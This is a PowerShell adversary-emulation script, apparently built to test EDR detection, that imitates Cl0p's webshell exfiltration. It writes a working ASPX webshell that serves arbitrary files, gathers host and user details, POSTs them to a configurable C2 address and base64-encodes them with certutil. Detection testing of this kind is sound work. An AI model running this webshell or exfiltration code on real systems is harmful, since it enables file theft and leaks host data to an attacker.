<#
.SYNOPSIS
    Cl0p Webshell Exfiltration - DETECTION TRIGGER
.DESCRIPTION
    Creates ASPX webshell and attempts HTTP POST exfiltration.
    TTP: T1567, T1505.003
#>
$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }

Write-Host "[*] Starting Cl0p Webshell Exfiltration (T1567)" -ForegroundColor Cyan

# Step 1: Create webshell artifact
Write-Host "`n[*] [T1505.003] Creating exfiltration webshell..."
$webDir = "C:\temp\clop_staging"
if (-not (Test-Path $webDir)) { New-Item -Path $webDir -ItemType Directory -Force | Out-Null }

$webshell = @"
<%@ Page Language="C#" %>
<!-- RTL Detection Test - Cl0p Exfil Webshell -->
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string action = Request.Form["action"];
    if (action == "download") {
        string path = Request.Form["path"];
        byte[] data = System.IO.File.ReadAllBytes(path);
        Response.BinaryWrite(data);
    }
}
</script>
"@
$webshell | Out-File "$webDir\errorpage.aspx" -Encoding UTF8
Write-Host "    [+] Webshell created: $webDir\errorpage.aspx" -ForegroundColor Green

# Step 2: Collect data for exfiltration
Write-Host "`n[*] [T1005] Collecting system data for exfiltration..."
$exfilData = @"
=== SYSTEM INFORMATION ===
Hostname: $(hostname)
Username: $(whoami)
Domain: $($env:USERDOMAIN)
IP Config: $(ipconfig | Out-String)
=== END ===
"@
$exfilPath = "$webDir\exfil_data.txt"
$exfilData | Out-File $exfilPath -Encoding UTF8
Write-Host "    [+] Data collected: $exfilPath" -ForegroundColor Green

# Step 3: HTTP POST exfiltration attempt
Write-Host "`n[*] [T1567] Attempting HTTP POST exfiltration to C2..."
Write-Host "    CMD: Invoke-WebRequest -Uri http://$C2Host`:8080/upload -Method POST"
try {
    $body = @{
        data = $exfilData
        hostname = $(hostname)
        timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    }
    Invoke-WebRequest -Uri "http://$C2Host`:8080/upload" -Method POST -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
    Write-Host "    [+] Exfiltration POST sent" -ForegroundColor Green
} catch {
    Write-Host "    [-] POST failed (expected if no C2 listener)" -ForegroundColor Gray
}

# Step 4: Alternative exfil via certutil encode
Write-Host "`n[*] [T1048] Base64 encoding data for alternative exfil..."
Write-Host "    CMD: certutil -encode $exfilPath encoded.b64"
certutil -encode $exfilPath "$webDir\encoded.b64" 2>&1
Write-Host "    [+] Encoded file ready for exfil" -ForegroundColor Green

Write-Host "`n[+] Webshell Exfiltration Simulation Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Webshell creation, HTTP POST exfil, certutil encoding, data collection" -ForegroundColor Magenta
